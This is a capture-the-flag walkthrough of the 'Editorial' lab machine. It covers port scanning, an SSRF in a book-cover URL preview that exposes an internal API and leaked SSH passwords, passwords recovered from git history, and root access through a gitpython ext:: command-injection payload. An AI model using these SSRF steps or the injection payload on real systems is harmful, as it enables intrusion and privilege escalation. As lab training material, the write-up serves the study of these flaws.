# Editorial

<figure><img src="../../.gitbook/assets/Editorial (1).png" alt=""><figcaption></figcaption></figure>

## Enumeration

```bash
nmap -v -A -O -p- -Pn editorial.htb -oN nmap
```

```bash
Nmap scan report for editorial.htb (10.10.11.20)
Host is up (0.051s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=6/25%OT=22%CT=1%CU=36690%PV=Y%DS=2%DC=T%G=Y%TM=667A
OS:8DC0%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53C
OS:ST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Uptime guess: 47.259 days (since Thu May  9 05:15:52 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   49.98 ms 10.10.14.1
2   50.05 ms editorial.htb (10.10.11.20)

NSE: Script Post-scanning.
Initiating NSE at 11:28
Completed NSE at 11:28, 0.01s elapsed
Initiating NSE at 11:28
Completed NSE at 11:28, 0.00s elapsed
Initiating NSE at 11:28
Completed NSE at 11:28, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.99 seconds
           Raw packets sent: 66482 (2.929MB) | Rcvd: 65859 (2.638MB)

```

### Port 80

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

On `/about` page we find another domain that is `tiempoarriba.htb`:

<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

Directories and files enumeration with `ffuf`:

<figure><img src="../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

There is the `/upload` page:

<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

The form allows you to upload a file depicting the book cover or submit the URL associated with the book cover. Also, it is possible to get a preview, but this does not seem to work because, as we can see, the file name is renamed and the file extension is removed. When we open the preview image in a new tab, the file is downloaded directly, so it seems that it is not possible to execute directly on the webserver any kind of command possibly injected into the uploaded file:

<figure><img src="../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

## Exploitation (dev)

If we try to intercept the request we can see that the URL is not sent to the backend and the response is the usual "Request Submited! blahblahblah...":

<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

Instead, the interesting part is the URL preview because this feature might be vulnerable to SSRF and allows an attacker to cause the server-side application to make requests to an unintended location:

<figure><img src="../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

but as before the file name is renamed and the file extension is removed.

However, this means that we can control the requests made from the backend to an endpoint we like externally or even internally. We check whether it is vulnerable to SSRF.

Using Burp Suite Repeater and the `http://127.0.0.1` as URL for the preview, we will obtain a result in the response:

<figure><img src="../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

This machine may have other services in the backend, we can enumerate them burp intruder and add a port number between 1-65535.

All the requests have this path in the response when requested a preview using a URL without any service running (that is the same shown before):

<figure><img src="../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

So filter this string with a negative search:

<figure><img src="../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

And we will find the only one with a different response, the port 5000:

<figure><img src="../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

Download the file and inspect it, seems to be a JSON:

<figure><img src="../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

It appears to be exposed on port 5000 an API endpoint and this appears to be the list of exposed methods.

Testing the various endpoints, the only one of interest is the following:

<figure><img src="../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

and we find juicy credentials:

<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

Username: dev

Password: dev080217\_devAPI!@

With these credentials we can only try to login using SSH:

<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

And user flag is here.

## Privilege Escalation (prod)

There is another user (prod) that own also the `/home/prod` directory:

<figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

Using the command `git log -p` we can inspect all the commit messages and differences commited to git repo. We can find the prod credential changed during the downgrade from prod to dev:

<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

Username: prod

Password: 080217\_Producti0n\_2023!@

ssh and get prod session :tada:

## Privilege Escalation (root)

The first thing to try on a Linux machine is always `sudo -l`:

<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

This is the code of script allowed to run as root that performs a clone of a Git repository using the `gitpython` library:

{% code overflow="wrap" %}
```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```
{% endcode %}

Searching online how work git module, we can find that <mark style="color:red;">**EVERY version of gitpython**</mark> is vulnerable to RCE

{% embed url="https://www.cve.org/CVERecord?id=CVE-2022-24439" %}

The PoC on Snyk website:

{% embed url="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858" %}

Affected versions of this package are vulnerable to Remote Code Execution (RCE) due to improper user input validation, which makes it possible to inject a maliciously crafted remote URL into the clone command. Exploiting this vulnerability is possible because the library makes external calls to `git` without sufficient sanitization of input arguments. This is only relevant when enabling the `ext` transport protocol, as done in the script with line:

```python
multi_options=["-c protocol.ext.allow=always"]
```

Change the command injected by dumping the root flag and saving the output to a file under /home/prod.&#x20;

{% code overflow="wrap" %}
```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >/home/prod/root.txt'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

Enjoy root :tada:
